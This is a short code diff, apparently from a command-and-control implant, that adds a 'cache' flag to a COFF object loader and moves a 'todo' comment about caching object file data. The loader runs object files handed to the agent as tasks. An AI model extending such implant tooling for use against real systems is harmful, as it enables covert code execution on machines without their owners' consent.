@@ -389,10 +389,11 @@ namespace Objects {
         x_assert(ExecuteFunction(object, entrypoint, args, args_size));
 
         defer:
+        // todo: caching coff file data
+
         Cleanup(object);
         RemoveCoff(object);
 
-        // todo: saving coff file data
         if (object) {
             x_memset(object, 0, sizeof(_executable));
             x_free(object);
@@ -413,12 +414,15 @@ namespace Objects {
 
     VOID LoadObject(_parser parser) {
 
+        bool cache = false;
+
         _injection_ctx  inject  = { };
         _coff_params    *params = (_coff_params*) x_malloc(sizeof(_coff_params));
 
         params->entrypoint  = Parser::UnpackString(&parser, (uint32_t*)&params->entrypoint_size);
         params->data        = Parser::UnpackBytes(&parser, (uint32_t*)&params->data_size);
         params->args        = Parser::UnpackBytes(&parser, (uint32_t*)&params->args_size);
+        params->cache       = Parser::UnpackBool(&parser);
         params->task_id     = Ctx->session.current_taskid;
 
         inject.parameter = params;
